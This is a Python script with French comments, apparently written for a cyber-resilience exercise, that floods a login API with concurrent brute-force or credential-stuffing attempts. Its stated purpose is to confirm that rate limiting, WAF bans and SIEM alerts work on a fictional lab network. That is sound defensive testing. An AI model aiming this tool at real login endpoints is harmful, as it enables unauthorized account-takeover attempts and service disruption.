#!/usr/bin/env python3
"""
attack_auth.py — Attaque par force brute / credential stuffing sur /api/auth/login
PROJECT RESILIENCE-ALPHA — usage strictement limité au SI fictif du consortium
(réseau RESILIENCE-G<n>, 192.168.137.0/24).

Contrairement à attack_payments.py (DoS volumétrique sur le service métier),
ce script cible directement la route d'authentification, déjà protégée par
une limitation de débit (10 req/min par IP côté passerelle, 5/min par IP et
par compte côté service) et un bannissement WAF après un seuil de requêtes
bloquées. L'objectif ici est double :
  - démontrer que ces protections existantes bloquent effectivement l'attaque
    (axe cybersécurité : efficacité des mesures de durcissement) ;
  - vérifier que les tentatives génèrent bien des événements exploitables
    côté SIEM/SOC (Grafana) et, si elle existe, l'alerte dédiée "force brute".

Deux modes :
  --mode bruteforce : un seul nom d'utilisateur fixe, mots de passe variés
                       (simule une tentative de devinette sur un compte connu).
  --mode credential-stuffing : couples utilisateur/mot de passe aléatoires
                       (simule l'essai de combinaisons volées ailleurs).

Usage :
    python3 attack_auth.py --target http://192.168.137.1:8080 \
                            --mode bruteforce --username admin \
                            --concurrency 50 --duration 30

Dépendances :
    pip install aiohttp
"""

import argparse
import asyncio
import random
import string
import sys
import time

try:
    import aiohttp
except ImportError:
    sys.exit("Dépendance manquante : pip install aiohttp")


def random_string(n):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


async def login_attempt(session, base_url, payload, stats):
    try:
        start = time.monotonic()
        async with session.post(f"{base_url}/api/auth/login", json=payload,
                                 timeout=aiohttp.ClientTimeout(total=5)) as resp:
            elapsed = time.monotonic() - start
            stats["latencies"].append(elapsed)
            if resp.status == 200:
                stats["unexpected_success"] += 1
            elif resp.status == 401:
                stats["rejected_401"] += 1
            elif resp.status == 429:
                stats["rate_limited_429"] += 1
            elif resp.status == 403:
                stats["blocked_waf_403"] += 1
            else:
                stats["other"].setdefault(resp.status, 0)
                stats["other"][resp.status] += 1
    except asyncio.TimeoutError:
        stats["timeouts"] += 1
    except Exception:
        stats["conn_errors"] += 1


async def worker(session, base_url, mode, username, stats, stop_at):
    while time.monotonic() < stop_at:
        if mode == "bruteforce":
            payload = {"username": username, "password": random_string(10)}
        else:  # credential-stuffing
            payload = {"username": "user_" + random_string(6), "password": random_string(10)}
        await login_attempt(session, base_url, payload, stats)


async def run_attack(target: str, mode: str, username: str, duration: int, concurrency: int):
    stats = {
        "unexpected_success": 0, "rejected_401": 0, "rate_limited_429": 0,
        "blocked_waf_403": 0, "timeouts": 0, "conn_errors": 0,
        "other": {}, "latencies": [],
    }

    print(f"[attack] mode : {mode}")
    print(f"[attack] cible : {target}/api/auth/login")
    print(f"[attack] durée : {duration}s | connexions concurrentes : {concurrency}")
    if mode == "bruteforce":
        print(f"[attack] utilisateur ciblé : {username}")
    print("[attack] démarrage... (attendez-vous à un bannissement WAF rapide, c'est le but)")

    connector = aiohttp.TCPConnector(limit=0)
    stop_at = time.monotonic() + duration

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session, target, mode, username, stats, stop_at))
                 for _ in range(concurrency)]
        await asyncio.gather(*tasks)

    total = (stats["unexpected_success"] + stats["rejected_401"] + stats["rate_limited_429"]
             + stats["blocked_waf_403"] + stats["timeouts"] + stats["conn_errors"]
             + sum(stats["other"].values()))
    avg_latency = sum(stats["latencies"]) / len(stats["latencies"]) if stats["latencies"] else 0

    print("\n[attack] terminé — récapitulatif :")
    print(f"  tentatives totales          : {total}")
    print(f"  connexions réussies (200)   : {stats['unexpected_success']}  (devrait être 0 si les identifiants sont aléatoires)")
    print(f"  rejets normaux (401)        : {stats['rejected_401']}")
    print(f"  limitées (429)              : {stats['rate_limited_429']}")
    print(f"  bloquées par le WAF (403)   : {stats['blocked_waf_403']}")
    print(f"  timeouts                    : {stats['timeouts']}")
    print(f"  erreurs de connexion        : {stats['conn_errors']}")
    if stats["other"]:
        print(f"  autres codes                : {stats['other']}")
    print(f"  latence moyenne             : {avg_latency:.3f}s")
    print("\n[attack] vérifiez Grafana : alerte force brute, bannissement WAF, journaux Loki sur auth.")
    if stats["unexpected_success"] > 0:
        print("[attack] ATTENTION : des connexions ont réussi — vérifiez qu'il ne s'agit pas d'une faille réelle.")


def main():
    parser = argparse.ArgumentParser(
        description="Attaque par force brute / credential stuffing sur /api/auth/login — RESILIENCE-ALPHA")
    parser.add_argument("--target", required=True,
                         help="URL de base de l'API, ex. http://192.168.137.1:8080 (sans /api/auth)")
    parser.add_argument("--mode", choices=["bruteforce", "credential-stuffing"], default="bruteforce",
                         help="bruteforce : un compte fixe, mots de passe variés. "
                              "credential-stuffing : couples utilisateur/mot de passe aléatoires.")
    parser.add_argument("--username", default="admin",
                         help="Nom d'utilisateur ciblé en mode bruteforce (défaut : admin)")
    parser.add_argument("--duration", type=int, default=30, help="Durée en secondes (défaut : 30)")
    parser.add_argument("--concurrency", type=int, default=50,
                         help="Connexions concurrentes (défaut : 50 — volontairement modéré, "
                              "le WAF devrait bannir bien avant d'avoir besoin de plus)")
    args = parser.parse_args()

    if "192.168.137." not in args.target:
        confirm = input(
            f"[attack] AVERTISSEMENT : la cible '{args.target}' ne semble pas appartenir au "
            f"réseau du consortium (192.168.137.0/24). Confirmez que c'est bien votre SI fictif autorisé. "
            f"Continuer ? [oui/N] "
        )
        if confirm.strip().lower() != "oui":
            print("[attack] annulé.")
            return

    asyncio.run(run_attack(args.target, args.mode, args.username, args.duration, args.concurrency))


if __name__ == "__main__":
    main()
